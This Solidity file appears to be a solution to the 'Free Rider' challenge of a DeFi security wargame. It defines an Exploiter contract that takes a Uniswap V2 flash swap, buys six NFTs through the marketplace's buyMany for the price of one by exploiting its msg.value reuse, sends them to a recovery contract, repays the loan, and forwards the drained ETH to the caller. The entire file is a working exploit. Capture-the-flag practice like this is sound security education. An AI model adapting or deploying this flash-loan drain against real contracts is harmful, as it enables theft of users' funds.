// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Exploiter is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace private immutable freeRiderNFTMarketplace;
    FreeRiderRecovery private immutable freeRiderRecovery;
    IUniswapV2Pair private immutable uniswapPair;
    DamnValuableNFT private immutable token;
    IWETH private immutable weth;

    constructor(
        address payable _freeRiderNFTMarketplaceAddress,
        address _freeRiderRecoveryAddress,
        address _uniswapPairAddress
    ) {
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(_freeRiderNFTMarketplaceAddress);
        freeRiderRecovery = FreeRiderRecovery(_freeRiderRecoveryAddress);
        uniswapPair = IUniswapV2Pair(_uniswapPairAddress);
        token = freeRiderNFTMarketplace.token();
        weth = IWETH(uniswapPair.token0());
    }

    function attack(uint256 amount) external payable {
        bytes memory data = abi.encode(msg.sender);
        uniswapPair.swap(amount, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(uniswapPair));
        require(sender == address(this));

        address caller = abi.decode(data, (address));

        weth.withdraw(amount0);
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            tokenIds[i] = i;
        }
        freeRiderNFTMarketplace.buyMany{value: amount0}(tokenIds);

        for (uint256 i = 0; i < tokenIds.length; i++) {
            token.safeTransferFrom(address(this), address(freeRiderRecovery), tokenIds[i], data);
        }

        // about 0.3% fee + 1 wei to round up
        uint256 fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;

        // repay
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapPair), amountToRepay);

        // send ETH sent from marketplace to caller
        (bool success,) = payable(caller).call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    function onERC721Received(address, address, uint256, bytes memory) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
